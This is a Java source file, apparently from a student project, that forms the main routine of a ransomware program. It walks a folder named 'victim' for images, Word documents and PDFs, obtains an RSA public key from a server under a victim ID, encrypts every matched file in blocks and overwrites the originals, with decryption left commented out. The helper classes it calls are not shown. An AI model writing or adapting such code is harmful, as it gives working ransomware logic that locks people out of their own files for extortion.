import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.security.Key;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import javax.crypto.KeyGenerator;

/**
 *
 * @author 20175707
 */
public class TestEnc {
    public static void main(String args[])
        throws NoSuchAlgorithmException, InstantiationException, IllegalAccessException, IOException, Exception {
        
        // decide which file type to find
        String glob = "glob:**/*.{jpg,png,docx,pdf}";
	// starting location of the search 	
        //String startingLocation = "C:/";
        String startingLocation = "/Users/admin/Desktop/victim";
        
        // Creating a FileFinder and saving the paths of the found files
        FileFinder fileFind = new FileFinder();
        fileFind.findFiles(glob, startingLocation);
        final ArrayList<Path> files = fileFind.fileFound;
        
        // Get Public Key
        String uniqueId = "victim35"; 
        ServerCommunication communicator = new ServerCommunication();
        PublicKey pub = communicator.getPublicKeyFromServer(uniqueId);
        
        
        // Creating an EncryptionDecryption object
        EncryptionDecription encDec = new EncryptionDecription();
        
        // Encrypting every file 
        for (Path path : files) {
            byte[] content = encDec.getBytesFile(path);
            byte[][] blocks = encDec.divideContentInBlocks(content, 117);
            byte[][] encryptedBlocks = new byte[blocks.length][]; 
            for(int i = 0; i < blocks.length; i++) {
                encryptedBlocks[i] = encDec.encryptBytesFile(pub, blocks[i]);
            }
            byte[] encryptedMerged = encDec.mergeContentBlocks(encryptedBlocks);
            // Saving the encrypted file
            encDec.bytesToFile(encryptedMerged, path);
        }
        
        /*
        // Decrypting every file 
        for (Path path : files) {
            byte[] content = encDec.getBytesFile(path);
            byte[][] blocks = encDec.divideContentInBlocks(content);
            byte[][] decryptedBlocks = new byte[blocks.length][]; 
            for(int i = 0; i < blocks.length; i++) {
                decryptedBlocks[i] = encDec.decryptBytesFile(pvt, blocks[i]);
            }
            byte[] decryptedMerged = encDec.mergeContentBlocks(decryptedBlocks);
            // Saving the decrypted file
            encDec.bytesToFile(decryptedMerged, path);
        }
*/

        System.out.println("Done");
    }
}